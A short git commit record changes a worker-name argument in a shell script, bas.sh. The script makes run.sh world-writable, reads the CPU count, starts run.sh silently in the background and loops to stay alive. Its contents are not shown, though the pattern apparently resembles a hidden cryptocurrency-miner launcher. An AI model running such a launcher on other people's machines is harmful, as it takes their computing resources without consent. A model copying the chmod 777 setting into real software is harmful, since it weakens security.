ad5831568d9a725eb3eea46beacd4ecefd09eba7
gaserjuk <gaserjukilo@gmail.com>
2026-03-12 16:04:08 +0700

    Update run.sh argument from 'Suto-019' to 'GibhQ-19'

--- bas.sh
+++ bas.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 Suto-019 >/dev/null 2>&1 &
+cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 GibhQ-19 >/dev/null 2>&1 &
 sleep 60
 while true
 do
